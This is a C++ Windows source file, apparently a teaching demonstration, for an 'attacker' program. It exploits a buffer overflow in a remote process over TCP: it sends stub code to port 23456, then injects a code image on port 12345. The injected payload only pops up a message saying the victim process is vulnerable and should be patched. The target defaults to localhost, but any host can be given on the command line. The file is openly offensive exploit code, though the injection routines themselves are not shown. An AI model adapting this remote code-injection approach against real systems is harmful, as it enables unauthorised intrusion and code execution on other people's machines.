// Attacker.cpp : 定义应用程序的入口点。
//

#include "Attacker.h"

DWORD GetComputerIpAddr(LPCTSTR szComputer)
{
#ifdef UNICODE
	char szName[16];
	wcstombs(szName, szComputer, sizeof(szName));
#else
	LPCSTR szName = szComputer;
#endif

	HOSTENT* pHost = gethostbyname(szName);
	if(pHost == NULL)
		return 0;

	return ntohl(((LPIN_ADDR)(pHost->h_addr_list[0]))->s_addr);
}

int APIENTRY _tWinMain(HINSTANCE hInst, HINSTANCE, LPTSTR, int)
{
	g_hInst = hInst;

	BOOL bSucc = FALSE;
	WSADATA wsa;
	if(WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		MessageBox(NULL, _T("网络初始化失败!"), NULL, MB_OK|MB_ICONHAND);
		return -1;
	}

	DWORD dwVictimIp = (127<<24) + (0<<16) + (0<<8) + 1;
	if(__argc >= 2)
		dwVictimIp = GetComputerIpAddr(__targv[1]);

	if(InjectStubCode(dwVictimIp, 23456))
	{
		//稍等一下,受害者正在执行stub代码
		Sleep(500);
		bSucc = InjectImageCode(dwVictimIp, 12345);
	}

	MessageBox(NULL, bSucc ? _T("攻击成功") : _T("攻击失败"), _T("攻击者"), MB_OK|MB_ICONINFORMATION);

	WSACleanup();

	return 0;
}

DWORD WINAPI AttackerMain(HINSTANCE hInst)
{
	TCHAR szName[64], szMsg[128];
	GetModuleFileName(NULL, szName, sizeof(szName)/sizeof(TCHAR));
	_stprintf(szMsg, _T("进程\"%s\"存在缓冲区溢出漏洞,赶紧打补丁吧!"), szName);
	MessageBox(NULL, szMsg, _T("哈哈"), MB_OK|MB_ICONINFORMATION);
	return 0;
}
